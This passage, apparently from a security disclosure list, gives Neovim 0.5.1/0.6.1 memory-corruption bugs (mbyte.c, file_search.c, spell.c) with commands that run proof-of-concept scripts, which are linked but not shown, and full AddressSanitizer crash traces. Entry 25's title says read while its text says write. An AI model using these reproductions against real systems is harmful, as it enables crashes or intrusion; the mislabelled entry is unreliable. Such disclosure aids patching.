    #128 0xc49dac in cmd_source /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_cmds2.c:1805:14
    #129 0xc4a4a3 in ex_source /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_cmds2.c:1786:3
    #130 0xc79f8f in do_one_cmd /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:1983:5
    #131 0xc646a5 in do_cmdline /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:604:20
    #132 0xc69f10 in do_cmdline_cmd /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:288:10
    #133 0xfaf82e in exe_commands /root/vuln/nvims/neovim-0.6.1/src/nvim/main.c:1654:5
    #134 0xf9f023 in main /root/vuln/nvims/neovim-0.6.1/src/nvim/main.c:493:5
    #135 0x7f8e702d2d8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #136 0x7f8e702d2e3f in __libc_start_main csu/../csu/libc-start.c:392:3
    #137 0x46a0c4 in _start (/root/vuln/nvims/neovim-0.6.1/build/bin/nvim+0x46a0c4)

0x7f8e5b51a000 is located 6144 bytes to the left of 9315507-byte region [0x7f8e5b51b800,0x7f8e5bdfdcb3)
allocated by thread T0 here:
    #0 0x4e4f8d in malloc (/root/vuln/nvims/neovim-0.6.1/build/bin/nvim+0x4e4f8d)
    #1 0x1114302 in try_malloc /root/vuln/nvims/neovim-0.6.1/src/nvim/memory.c:74:15
    #2 0x11144ec in xmalloc /root/vuln/nvims/neovim-0.6.1/src/nvim/memory.c:108:15
    #3 0xbce7de in ex_retab /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_cmds.c:819:24
    #4 0xc79f8f in do_one_cmd /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:1983:5
    #5 0xc646a5 in do_cmdline /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:604:20
    #6 0x992e05 in ex_execute /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:9941:7
    #7 0xc79f8f in do_one_cmd /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:1983:5
    #8 0xc646a5 in do_cmdline /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:604:20
    #9 0xb66cd0 in call_user_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:1114:5
    #10 0xb5f771 in call_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:1580:11
    #11 0xb5babf in get_func_tv /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:459:11
    #12 0x9c6029 in eval_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3304:13
    #13 0x9bcb3e in eval7 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:4232:15
    #14 0x9b8221 in eval6 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3903:7
    #15 0x9b5818 in eval5 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3728:7
    #16 0x9b41d6 in eval4 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3622:7
    #17 0x9b3788 in eval3 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3541:7
    #18 0x947ee8 in eval2 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3470:7
    #19 0x929fca in eval1 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3394:7
    #20 0xb5b426 in get_func_tv /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:430:9
    #21 0xb90142 in ex_call /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:3008:9
    #22 0xc79f8f in do_one_cmd /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:1983:5
    #23 0xc646a5 in do_cmdline /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:604:20
    #24 0xb66cd0 in call_user_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:1114:5
    #25 0xb5f771 in call_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:1580:11
    #26 0xb5babf in get_func_tv /root/vuln/nvims/neovim-0.6.1/src/nvim/eval/userfunc.c:459:11
    #27 0x9c6029 in eval_func /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3304:13
    #28 0x9bcb3e in eval7 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:4232:15
    #29 0x9b8221 in eval6 /root/vuln/nvims/neovim-0.6.1/src/nvim/eval.c:3903:7

SUMMARY: AddressSanitizer: heap-buffer-overflow (/root/vuln/nvims/neovim-0.6.1/build/bin/nvim+0x4e4841) in __asan_memmove
Shadow bytes around the buggy address:
  0x0ff24b69b3b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0ff24b69b3c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0ff24b69b3d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0ff24b69b3e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0ff24b69b3f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x0ff24b69b400:[fa]fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0ff24b69b410: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0ff24b69b420: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0ff24b69b430: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0ff24b69b440: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0ff24b69b450: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
==3188201==ABORTING
```

# 24. Neovim <=0.6.1 Heap Buffer Overflow in `src/nvim/mbyte.c`

## Description
Neovim versions up to and including 0.6.1 are affected by a vulnerability where a heap buffer overflow occurs in the `mbyte.c` file at line 1620. This issue is triggered when processing specially crafted input, such as a file or command, that causes the application to read beyond the bounds of a heap-allocated buffer. The vulnerability could be exploited by an attacker to cause a denial of service (DoS) condition or potentially execute arbitrary code.

## PoC
poc at [C220729](./C220729).
```sh
$ ./nvims/neovim-0.6.1/build/bin/nvim -u NONE -i NONE -e -n -m -X -s -S ./C220729 -c :qa! 
=================================================================
==3188275==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6210000384ff at pc 0x0000010aaa9d bp 0x7ffc969933c0 sp 0x7ffc969933b8
READ of size 1 at 0x6210000384ff thread T0
    #0 0x10aaa9c in utf_head_off /root/vuln/nvims/neovim-0.6.1/src/nvim/mbyte.c:1620:7
    #1 0x1562f43 in regmatch /root/vuln/nvims/neovim-0.6.1/src/nvim/regexp.c:5122:17
    #2 0x1548ba8 in regtry /root/vuln/nvims/neovim-0.6.1/src/nvim/regexp.c:3684:7
    #3 0x1547437 in bt_regexec_both /root/vuln/nvims/neovim-0.6.1/src/nvim/regexp.c:3576:16
    #4 0x1537525 in bt_regexec_nl /root/vuln/nvims/neovim-0.6.1/src/nvim/regexp.c:3367:12
    #5 0x149ddb7 in vim_regexec_string /root/vuln/nvims/neovim-0.6.1/src/nvim/regexp.c:7364:16
    #6 0x149e114 in vim_regexec /root/vuln/nvims/neovim-0.6.1/src/nvim/regexp.c:7395:10
    #7 0x7b2336 in fname_match /root/vuln/nvims/neovim-0.6.1/src/nvim/buffer.c:2403:9
    #8 0x77fbee in buflist_match /root/vuln/nvims/neovim-0.6.1/src/nvim/buffer.c:2386:13
    #9 0x7755f5 in buflist_findpat /root/vuln/nvims/neovim-0.6.1/src/nvim/buffer.c:2187:18
    #10 0xc7971f in do_one_cmd /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:1953:16
    #11 0xc646a5 in do_cmdline /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:604:20
    #12 0xc4ed63 in do_source /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_cmds2.c:2242:5
    #13 0xc49dac in cmd_source /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_cmds2.c:1805:14
    #14 0xc4a4a3 in ex_source /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_cmds2.c:1786:3
    #15 0xc79f8f in do_one_cmd /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:1983:5
    #16 0xc646a5 in do_cmdline /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:604:20
    #17 0xc69f10 in do_cmdline_cmd /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:288:10
    #18 0xfaf82e in exe_commands /root/vuln/nvims/neovim-0.6.1/src/nvim/main.c:1654:5
    #19 0xf9f023 in main /root/vuln/nvims/neovim-0.6.1/src/nvim/main.c:493:5
    #20 0x7fab965ced8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #21 0x7fab965cee3f in __libc_start_main csu/../csu/libc-start.c:392:3
    #22 0x46a0c4 in _start (/root/vuln/nvims/neovim-0.6.1/build/bin/nvim+0x46a0c4)

0x6210000384ff is located 1 bytes to the left of 4096-byte region [0x621000038500,0x621000039500)
allocated by thread T0 here:
    #0 0x4e4f8d in malloc (/root/vuln/nvims/neovim-0.6.1/build/bin/nvim+0x4e4f8d)
    #1 0x1114302 in try_malloc /root/vuln/nvims/neovim-0.6.1/src/nvim/memory.c:74:15
    #2 0x11144ec in xmalloc /root/vuln/nvims/neovim-0.6.1/src/nvim/memory.c:108:15
    #3 0x13f1665 in FullName_save /root/vuln/nvims/neovim-0.6.1/src/nvim/path.c:477:15
    #4 0x13fc579 in fix_fname /root/vuln/nvims/neovim-0.6.1/src/nvim/path.c:1818:10
    #5 0x77c16f in fname_expand /root/vuln/nvims/neovim-0.6.1/src/nvim/buffer.c:4673:23
    #6 0x76f82d in buflist_new /root/vuln/nvims/neovim-0.6.1/src/nvim/buffer.c:1667:3
    #7 0xbe35c9 in do_ecmd /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_cmds.c:2437:13
    #8 0xcb85cf in do_exedit /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:7489:9
    #9 0xcb635a in ex_splitview /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:7209:5
    #10 0xc79f8f in do_one_cmd /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:1983:5
    #11 0xc646a5 in do_cmdline /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:604:20
    #12 0xc4ed63 in do_source /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_cmds2.c:2242:5
    #13 0xc49dac in cmd_source /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_cmds2.c:1805:14
    #14 0xc4a4a3 in ex_source /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_cmds2.c:1786:3
    #15 0xc79f8f in do_one_cmd /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:1983:5
    #16 0xc646a5 in do_cmdline /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:604:20
    #17 0xc69f10 in do_cmdline_cmd /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:288:10
    #18 0xfaf82e in exe_commands /root/vuln/nvims/neovim-0.6.1/src/nvim/main.c:1654:5
    #19 0xf9f023 in main /root/vuln/nvims/neovim-0.6.1/src/nvim/main.c:493:5
    #20 0x7fab965ced8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16

SUMMARY: AddressSanitizer: heap-buffer-overflow /root/vuln/nvims/neovim-0.6.1/src/nvim/mbyte.c:1620:7 in utf_head_off
Shadow bytes around the buggy address:
  0x0c427ffff040: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c427ffff050: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c427ffff060: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c427ffff070: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c427ffff080: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
=>0x0c427ffff090: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa[fa]
  0x0c427ffff0a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c427ffff0b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c427ffff0c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c427ffff0d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c427ffff0e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
==3188275==ABORTING
```

# 25. Neovim <=0.6.1 Out-of-bounds Read in `src/nvim/file_search.c`

## Description
Neovim versions up to and including 0.6.1 are affected by a vulnerability where an out-of-bounds write occurs in the `file_search.c` file at line 1440. This issue is triggered when processing specially crafted input, such as a file or command, that causes the application to attempt a write operation on an invalid memory address. The vulnerability could be exploited by an attacker to cause a denial of service (DoS) condition.

## PoC
poc at [C213973](./C213973).
```sh
$ ./nvims/neovim-0.6.1/build/bin/nvim -u NONE -i NONE -e -n -m -X -s -S ./C213973 -c :qa! 
AddressSanitizer:DEADLYSIGNAL
=================================================================
==3188327==ERROR: AddressSanitizer: SEGV on unknown address 0x000001efc840 (pc 0x000000dd5a36 bp 0x7ffca06ab0a0 sp 0x7ffca06aad00 T0)
==3188327==The signal is caused by a WRITE memory access.
    #0 0xdd5a36 in find_file_in_path_option /root/vuln/nvims/neovim-0.6.1/src/nvim/file_search.c:1440:14
    #1 0xdd56a7 in find_file_in_path /root/vuln/nvims/neovim-0.6.1/src/nvim/file_search.c:1375:10
    #2 0x13fb384 in find_file_name_in_path /root/vuln/nvims/neovim-0.6.1/src/nvim/path.c:1684:17
    #3 0x1bca258 in grab_file_name /root/vuln/nvims/neovim-0.6.1/src/nvim/window.c:6121:12
    #4 0x1bbc173 in do_window /root/vuln/nvims/neovim-0.6.1/src/nvim/window.c:444:11
    #5 0x123c03e in nv_window /root/vuln/nvims/neovim-0.6.1/src/nvim/normal.c:6823:5
    #6 0x123389c in normal_execute /root/vuln/nvims/neovim-0.6.1/src/nvim/normal.c:1164:3
    #7 0x122be42 in normal_cmd /root/vuln/nvims/neovim-0.6.1/src/nvim/normal.c:8424:9
    #8 0xcbd6e0 in exec_normal /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:8732:5
    #9 0xcbd3ee in exec_normal_cmd /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:8715:3
    #10 0xcea50f in ex_normal /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:8641:7
    #11 0xc79f8f in do_one_cmd /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:1983:5
    #12 0xc646a5 in do_cmdline /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:604:20
    #13 0x74c850 in apply_autocmds_group /root/vuln/nvims/neovim-0.6.1/src/nvim/autocmd.c:1604:5
    #14 0x752647 in apply_autocmds /root/vuln/nvims/neovim-0.6.1/src/nvim/autocmd.c:1264:10
    #15 0x773828 in buflist_new /root/vuln/nvims/neovim-0.6.1/src/nvim/buffer.c:1840:9
    #16 0x789231 in buflist_add /root/vuln/nvims/neovim-0.6.1/src/nvim/buffer.c:2921:9
    #17 0xcb4431 in alist_add /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:7080:7
    #18 0xcb400b in alist_set /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:7053:7
    #19 0xc3f82f in do_arglist /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_cmds2.c:986:7
    #20 0xc3aa86 in ex_next /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_cmds2.c:1205:11
    #21 0xc79f8f in do_one_cmd /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:1983:5
    #22 0xc646a5 in do_cmdline /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:604:20
    #23 0xc4ed63 in do_source /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_cmds2.c:2242:5
    #24 0xc49dac in cmd_source /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_cmds2.c:1805:14
    #25 0xc4a4a3 in ex_source /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_cmds2.c:1786:3
    #26 0xc79f8f in do_one_cmd /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:1983:5
    #27 0xc646a5 in do_cmdline /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:604:20
    #28 0xc69f10 in do_cmdline_cmd /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:288:10
    #29 0xfaf82e in exe_commands /root/vuln/nvims/neovim-0.6.1/src/nvim/main.c:1654:5
    #30 0xf9f023 in main /root/vuln/nvims/neovim-0.6.1/src/nvim/main.c:493:5
    #31 0x7fb6967b3d8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #32 0x7fb6967b3e3f in __libc_start_main csu/../csu/libc-start.c:392:3
    #33 0x46a0c4 in _start (/root/vuln/nvims/neovim-0.6.1/build/bin/nvim+0x46a0c4)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV /root/vuln/nvims/neovim-0.6.1/src/nvim/file_search.c:1440:14 in find_file_in_path_option
==3188327==ABORTING
```

# 26. Neovim 0.5.1 Stack Buffer Overflow in `src/nvim/spell.c`

## Description
Neovim versions up to and including 0.5.1 are affected by a vulnerability where a stack buffer overflow occurs in the `spell.c` file at line 4807. This issue is triggered when processing specially crafted input, such as a file or command, that causes the application to write beyond the bounds of a stack-allocated buffer. The vulnerability could be exploited by an attacker to cause a denial of service (DoS) condition or potentially execute arbitrary code.

## PoC
poc at [C220408](./C220408).
```sh
$ ./nvims/neovim-0.5.1/build/bin/nvim -u NONE -i NONE -e -n -m -X -s -S ./C220408 -c :qa!  
=================================================================
==3188458==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7ffeae55d640 at pc 0x0000004e441a bp 0x7ffeae55b3a0 sp 0x7ffeae55ab68
WRITE of size 32 at 0x7ffeae55d640 thread T0
    #0 0x4e4419 in __asan_memcpy (/root/vuln/nvims/neovim-0.5.1/build/bin/nvim+0x4e4419)
    #1 0x17a13d0 in go_deeper /root/vuln/nvims/neovim-0.5.1/src/nvim/spell.c:4807:22
    #2 0x178d6f0 in suggest_trie_walk /root/vuln/nvims/neovim-0.5.1/src/nvim/spell.c:4100:13
    #3 0x177c39f in suggest_try_change /root/vuln/nvims/neovim-0.5.1/src/nvim/spell.c:3581:5
    #4 0x176c7dd in spell_suggest_intern /root/vuln/nvims/neovim-0.5.1/src/nvim/spell.c:3360:3
    #5 0x174e4aa in spell_find_suggest /root/vuln/nvims/neovim-0.5.1/src/nvim/spell.c:3251:7
    #6 0x1747d0f in spell_suggest /root/vuln/nvims/neovim-0.5.1/src/nvim/spell.c:2840:3
    #7 0x1214b20 in nv_zet /root/vuln/nvims/neovim-0.5.1/src/nvim/normal.c:4617:7
    #8 0x11d3390 in normal_execute /root/vuln/nvims/neovim-0.5.1/src/nvim/normal.c:1148:3
    #9 0x11cb952 in normal_cmd /root/vuln/nvims/neovim-0.5.1/src/nvim/normal.c:8164:9
    #10 0xc6ad80 in exec_normal /root/vuln/nvims/neovim-0.5.1/src/nvim/ex_docmd.c:8514:5
    #11 0xc6aa8e in exec_normal_cmd /root/vuln/nvims/neovim-0.5.1/src/nvim/ex_docmd.c:8497:3
    #12 0xc97adf in ex_normal /root/vuln/nvims/neovim-0.5.1/src/nvim/ex_docmd.c:8425:7
    #13 0xc27e54 in do_one_cmd /root/vuln/nvims/neovim-0.5.1/src/nvim/ex_docmd.c:1969:5
    #14 0xc12728 in do_cmdline /root/vuln/nvims/neovim-0.5.1/src/nvim/ex_docmd.c:599:20
    #15 0xbfcd9e in do_source /root/vuln/nvims/neovim-0.5.1/src/nvim/ex_cmds2.c:3061:5
    #16 0xbf7e0b in cmd_source /root/vuln/nvims/neovim-0.5.1/src/nvim/ex_cmds2.c:2633:14
    #17 0xbf8503 in ex_source /root/vuln/nvims/neovim-0.5.1/src/nvim/ex_cmds2.c:2614:3
    #18 0xc27e54 in do_one_cmd /root/vuln/nvims/neovim-0.5.1/src/nvim/ex_docmd.c:1969:5
    #19 0xc12728 in do_cmdline /root/vuln/nvims/neovim-0.5.1/src/nvim/ex_docmd.c:599:20
    #20 0xc17e30 in do_cmdline_cmd /root/vuln/nvims/neovim-0.5.1/src/nvim/ex_docmd.c:287:10
    #21 0xf5440e in exe_commands /root/vuln/nvims/neovim-0.5.1/src/nvim/main.c:1731:5
    #22 0xf43a8e in main /root/vuln/nvims/neovim-0.5.1/src/nvim/main.c:508:5
    #23 0x7f75f6c20d8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #24 0x7f75f6c20e3f in __libc_start_main csu/../csu/libc-start.c:392:3
    #25 0x46a0f4 in _start (/root/vuln/nvims/neovim-0.5.1/build/bin/nvim+0x46a0f4)

Address 0x7ffeae55d640 is located in stack of thread T0 at offset 8480 in frame
    #0 0x177feef in suggest_trie_walk /root/vuln/nvims/neovim-0.5.1/src/nvim/spell.c:3622

  This frame has 4 object(s):
    [32, 286) 'tword' (line 3623)
    [352, 8480) 'stack' (line 3624) <== Memory access at offset 8480 overflows this variable
    [8736, 9498) 'preword' (line 3625)
    [9632, 9886) 'compflags' (line 3630)
HINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork
      (longjmp and C++ exceptions *are* supported)
SUMMARY: AddressSanitizer: stack-buffer-overflow (/root/vuln/nvims/neovim-0.5.1/build/bin/nvim+0x4e4419) in __asan_memcpy
Shadow bytes around the buggy address:
  0x100055ca3a70: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x100055ca3a80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x100055ca3a90: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x100055ca3aa0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x100055ca3ab0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x100055ca3ac0: 00 00 00 00 00 00 00 00[f2]f2 f2 f2 f2 f2 f2 f2
  0x100055ca3ad0: f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2
  0x100055ca3ae0: f2 f2 f2 f2 f2 f2 f2 f2 00 00 00 00 00 00 00 00
  0x100055ca3af0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x100055ca3b00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x100055ca3b10: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
==3188458==ABORTING
```
